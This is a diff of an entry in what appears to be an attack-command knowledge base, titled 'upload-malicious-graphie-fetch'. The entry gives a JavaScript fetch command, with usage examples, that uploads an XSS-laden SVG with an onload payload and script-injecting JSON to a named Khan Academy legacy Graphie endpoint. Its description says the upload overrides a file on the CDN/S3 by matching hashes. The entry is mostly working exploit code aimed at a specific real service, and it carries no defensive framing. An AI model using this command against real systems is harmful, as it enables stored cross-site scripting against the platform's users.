@@ -1,49 +1,47 @@
 ---
+id: cmd-upload-graphie-001
+name: upload-malicious-graphie-fetch
+type: command
+executor: javascript
 data: >-
-  var form = new FormData(); form.append("js", ORIGINAL_JS); form.append("svg",
-  XSS_SVG); form.append("other_data", JSON.stringify(XSS_JSON)); await
-  fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body":
-  form }).then(r => r.text())
+  var form = new FormData(); form.append("js",ORIGINAL_JS);
+  form.append("svg",XSS_SVG);
+  form.append("other_data",JSON.stringify(XSS_JSON)); await
+  fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body":
+  form}).then(r=>r.text())
+output: Text response from the server after successful upload
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:32:48.269Z'
+platforms:
+  - Web
 tags:
   - xss
   - upload
-  - fetch
-type: command
-output: null
-executor: javascript
-platforms:
-  - Web
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-13T23:55:20.690Z'
-id: 2f1e019a-7761-40d2-84e9-b6bd3d7b1f3e
 verified: false
 validated: true
 submitted: true
 ---
+
 # upload-malicious-graphie-fetch
 
 ## Command
 
 ```javascript
-var form = new FormData();
-form.append("js", ORIGINAL_JS);
-form.append("svg", XSS_SVG);
-form.append("other_data", JSON.stringify(XSS_JSON));
-await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form }).then(r => r.text())
+var form = new FormData(); form.append("js",ORIGINAL_JS); form.append("svg",XSS_SVG); form.append("other_data",JSON.stringify(XSS_JSON)); await fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body": form}).then(r=>r.text())
 ```
 
 ## Description
 
-This JavaScript command uses the Fetch API to upload a malicious graphie by sending FormData with original JS, XSS-laden SVG, and JSON to the legacy Khan Academy API, overriding hashes for XSS injection.
+This JavaScript command creates a FormData object with Graphie components and POSTs to the legacy API to upload and override a malicious file on the CDN/S3.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| ORIGINAL_JS | Legitimate JavaScript code for hash matching | Yes |
-| XSS_SVG | Malicious SVG string (e.g., with onload attribute) | Yes |
-| XSS_JSON | Object with script content and typesetAsMath: false | Yes |
-| endpoint | API URL (default: http://graphie-to-png.kasandbox.org/svg) | Yes |
+| ORIGINAL_JS | Original JavaScript code for the Graphie | Yes |
+| XSS_SVG | Malicious SVG content with onload payload | Yes |
+| XSS_JSON | Malicious JSON object with script injection | Yes |
+| url | API endpoint (e.g., http://graphie-to-png.kasandbox.org/svg) | Yes |
 | method | HTTP method (POST) | Yes |
 | body | FormData object | Yes |
 
@@ -52,25 +50,21 @@ This JavaScript command uses the Fetch API to upload a malicious graphie by send
 ### Basic Usage
 
 ```javascript
-var form = new FormData();
-form.append("js", 'Grapher.init(...)');
-form.append("svg", '<svg onload="alert(\'XSS\')"></svg>');
-form.append("other_data", JSON.stringify({content: '<script>alert("XSS")</script>', typesetAsMath: false}));
-await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form }).then(r => r.text())
+var form = new FormData(); form.append("js","var graph = new Graphie();"); form.append("svg","<svg onload=\"alert('XSS')\"></svg>"); form.append("other_data",JSON.stringify({labels:[{text:"<script>alert('XSS')</script>",typesetAsMath:false}]})); await fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body": form}).then(r=>r.text())
 ```
 
 ### Advanced Usage
 
 ```javascript
 // With error handling
-const response = await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form });
-if (response.ok) { console.log(await response.text()); } else { console.error('Upload failed'); }
+const response = await fetch("http://graphie-to-png.khanacademy.systems/svg", {method: "POST", body: form}).then(r => { if (r.ok) return r.text(); else throw new Error('Upload failed'); });
+console.log(response);
 ```
 
 ## Expected Output
 
-Server response text, such as the generated PNG URL or hash (e.g., "https://cdn.kastatic.org/..."). Success indicated by 200 status and no validation errors.
+A plain text response from the server, typically indicating successful processing (e.g., empty string or status message) if the upload overrides the file by hash.
 
 ## Related
 
-- [[Related Procedure: Upload-Malicious-Graphie-via-Legacy-API]]
+- [[procedures/Upload-Malicious-Graphie-via-Legacy-API]]
